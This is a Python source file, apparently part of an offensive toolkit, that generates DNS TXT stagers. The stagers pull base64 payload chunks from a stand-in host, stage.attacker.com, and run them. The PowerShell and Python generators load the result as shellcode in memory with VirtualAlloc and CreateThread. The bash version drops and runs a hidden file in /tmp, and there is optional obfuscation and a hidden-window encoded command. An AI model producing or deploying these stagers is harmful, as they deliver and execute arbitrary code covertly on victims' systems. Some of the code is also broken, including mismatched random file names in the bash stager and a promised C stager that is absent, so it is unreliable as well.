"""DNS TXT Record Stager.

Encodes the stage payload in base32/base64 across DNS TXT records
served from a controlled nameserver.

Stager types:
  - PowerShell:  Resolve-DnsName (Windows)
  - PowerShell:  [System.Net.Dns]::GetHostAddresses fallback
  - bash:        dig +short TXT pull (Linux)
  - Python:      dnspython / socket fallback
  - C:           raw UDP DNS query (Windows/Linux)

Server-side: serve TXT records from your DNS zone like:
  chunk0.stage.attacker.com.  IN TXT  "BASE64_CHUNK_0"
  chunk1.stage.attacker.com.  IN TXT  "BASE64_CHUNK_1"
  n.stage.attacker.com.       IN TXT  "3"   (total chunks)

FOR AUTHORIZED PENETRATION TESTING ONLY.
"""
from __future__ import annotations

import base64
import math
import secrets
import textwrap
from typing import Any


class DnsStager:
    """DNS TXT stager generator."""

    # DNS TXT records are limited to 255 bytes per string.
    # We use 200 chars of base64 per chunk to stay safely under limits.
    CHUNK_SIZE = 200

    def __init__(
        self,
        domain: str = "stage.attacker.com",
        nameserver: str = "",
        record_prefix: str = "chunk",
        count_record: str = "n",
    ):
        self.domain        = domain
        self.nameserver    = nameserver  # if empty, use system resolver
        self.record_prefix = record_prefix
        self.count_record  = count_record

    def chunk_payload(self, data: bytes) -> tuple[list[str], dict[str, str]]:
        """Split data into base64 chunks for DNS TXT serving.

        Returns:
            (list_of_chunks, zone_file_entries)
        """
        b64    = base64.b64encode(data).decode()
        chunks = [b64[i:i+self.CHUNK_SIZE]
                  for i in range(0, len(b64), self.CHUNK_SIZE)]

        zone: dict[str, str] = {}
        zone[f"{self.count_record}.{self.domain}"] = str(len(chunks))
        for i, chunk in enumerate(chunks):
            zone[f"{self.record_prefix}{i}.{self.domain}"] = chunk

        return chunks, zone

    def powershell_stager(self, obfuscate: bool = True) -> tuple[bytes, str]:
        """PowerShell DNS TXT stager (Resolve-DnsName)."""
        script = self._ps1_stager(obfuscate)
        b64    = base64.b64encode(script.encode("utf-16-le")).decode()
        one    = f"powershell.exe -NonInteractive -WindowStyle Hidden -EncodedCommand {b64}"
        return script.encode(), one

    def bash_stager(self) -> tuple[bytes, str]:
        """bash/dig DNS TXT stager (Linux)."""
        script = self._bash_stager()
        one    = f"bash -c \"$(dig +short TXT {self.count_record}.{self.domain} | tr -d '\\\"')\""
        return script.encode(), one

    def python_stager(self) -> tuple[bytes, str]:
        """Python DNS stager using socket.getaddrinfo fallback."""
        script = self._python_stager()
        one    = f"python3 dns_stager.py"
        return script.encode(), one

    def zone_file_example(self, payload_len: int = 256) -> str:
        """Return example BIND zone file entries for a payload of given length."""
        dummy    = b"A" * payload_len
        _, zones = self.chunk_payload(dummy)
        lines    = [f"; DNS TXT records for Forge DNS stager"]
        lines   += [f"; Zone: {self.domain}"]
        lines   += [f"; FOR AUTHORIZED PENETRATION TESTING ONLY.", ""]
        for name, val in zones.items():
            lines.append(f'{name}.\t60\tIN\tTXT\t"{val}"')
        return "\n".join(lines)

    # ── Private generators ─────────────────────────────────────────────

    def _ps1_stager(self, obfuscate: bool) -> str:
        domain = self.domain
        ns_arg = f" -Server {self.nameserver}" if self.nameserver else ""
        prefix = self.record_prefix
        count  = self.count_record

        vn     = ("$" + secrets.token_hex(3)) if obfuscate else "$n"
        vchunks = ("$" + secrets.token_hex(3)) if obfuscate else "$chunks"
        vi     = ("$" + secrets.token_hex(3)) if obfuscate else "$i"
        vsc    = ("$" + secrets.token_hex(3)) if obfuscate else "$sc"
        vm     = ("$" + secrets.token_hex(3)) if obfuscate else "$mem"

        return textwrap.dedent(f"""\
        # Forge DNS TXT Stager — PowerShell
        # Domain: {domain}
        # FOR AUTHORIZED PENETRATION TESTING ONLY.
        $ErrorActionPreference = 'SilentlyContinue'
        {vn} = (Resolve-DnsName '{count}.{domain}' -Type TXT{ns_arg}).Strings[0] -as [int]
        if (-not {vn}) {{ exit 1 }}
        {vchunks} = @()
        for ({vi} = 0; {vi} -lt {vn}; {vi}++) {{
            $chunk = (Resolve-DnsName "{prefix}${{{vi}}}.{domain}" -Type TXT{ns_arg}).Strings[0]
            {vchunks} += $chunk
        }}
        {vsc} = [Convert]::FromBase64String(({vchunks} -join ''))
        $k = Add-Type -MemberDefinition @'
            [DllImport("kernel32")]
            public static extern IntPtr VirtualAlloc(IntPtr a,UIntPtr b,uint c,uint d);
            [DllImport("kernel32")]
            public static extern bool VirtualProtect(IntPtr a,UIntPtr b,uint c,out uint d);
            [DllImport("kernel32")]
            public static extern IntPtr CreateThread(IntPtr a,UIntPtr b,IntPtr c,IntPtr d,uint e,IntPtr f);
            [DllImport("kernel32")]
            public static extern uint WaitForSingleObject(IntPtr h,uint ms);
        '@ -Name 'D{secrets.token_hex(3)}' -Namespace 'F' -PassThru
        {vm} = $k::VirtualAlloc(0,[UIntPtr]{vsc}.Length,0x3000,0x04)
        [System.Runtime.InteropServices.Marshal]::Copy({vsc},0,{vm},{vsc}.Length)
        $o=0; $k::VirtualProtect({vm},[UIntPtr]{vsc}.Length,0x20,[ref]$o)|Out-Null
        $t=$k::CreateThread(0,0,{vm},0,0,0)
        $k::WaitForSingleObject($t,0xFFFFFFFF)|Out-Null
        """)

    def _bash_stager(self) -> str:
        domain = self.domain
        ns_arg = f"@{self.nameserver} " if self.nameserver else ""
        prefix = self.record_prefix
        count  = self.count_record

        return textwrap.dedent(f"""\
        #!/usr/bin/env bash
        # Forge DNS TXT Stager — bash/dig
        # Domain: {domain}
        # FOR AUTHORIZED PENETRATION TESTING ONLY.
        N=$(dig +short {ns_arg}TXT "{count}.{domain}" | tr -d '"' | tr -d ' ')
        B64=""
        for i in $(seq 0 $((N-1))); do
            chunk=$(dig +short {ns_arg}TXT "{prefix}$i.{domain}" | tr -d '"' | tr -d ' ')
            B64="${{B64}}${{chunk}}"
        done
        echo "$B64" | base64 -d > /tmp/.{secrets.token_hex(4)}
        chmod +x /tmp/.{secrets.token_hex(4)}
        nohup /tmp/.{secrets.token_hex(4)} >/dev/null 2>&1 &
        disown
        """)

    def _python_stager(self) -> str:
        domain = self.domain
        ns     = self.nameserver or "8.8.8.8"
        prefix = self.record_prefix
        count  = self.count_record

        return textwrap.dedent(f"""\
        #!/usr/bin/env python3
        # Forge DNS TXT Stager — Python
        # Domain: {domain}
        # FOR AUTHORIZED PENETRATION TESTING ONLY.
        import base64, ctypes, sys

        def dns_txt(name):
            try:
                import dns.resolver
                r = dns.resolver.Resolver()
                r.nameservers = ['{ns}']
                ans = r.resolve(name, 'TXT')
                return ''.join(str(rd).strip('"') for rd in ans)
            except Exception:
                import subprocess
                out = subprocess.check_output(['dig','+short','TXT',name], text=True)
                return out.strip().strip('"')

        n     = int(dns_txt('{count}.{domain}'))
        b64   = ''.join(dns_txt(f'{prefix}{{i}}.{domain}') for i in range(n))
        stage = base64.b64decode(b64)

        if sys.platform == 'win32':
            buf = (ctypes.c_char * len(stage))(*stage)
            mem = ctypes.windll.kernel32.VirtualAlloc(0, len(stage), 0x3000, 0x04)
            ctypes.cdll.msvcrt.memcpy(mem, buf, len(stage))
            ctypes.windll.kernel32.VirtualProtect(mem, len(stage), 0x20,
                                                   ctypes.byref(ctypes.c_uint(0)))
            t = ctypes.windll.kernel32.CreateThread(0,0,mem,0,0,0)
            ctypes.windll.kernel32.WaitForSingleObject(t, 0xFFFFFFFF)
        else:
            import mmap, os
            m = mmap.mmap(-1, len(stage), mmap.MAP_SHARED,
                          mmap.PROT_READ|mmap.PROT_WRITE|mmap.PROT_EXEC)
            m.write(stage)
            m.seek(0)
            fn = ctypes.CFUNCTYPE(None)(ctypes.addressof(
                (ctypes.c_char * len(stage)).from_buffer(m)))
            fn()
        """)
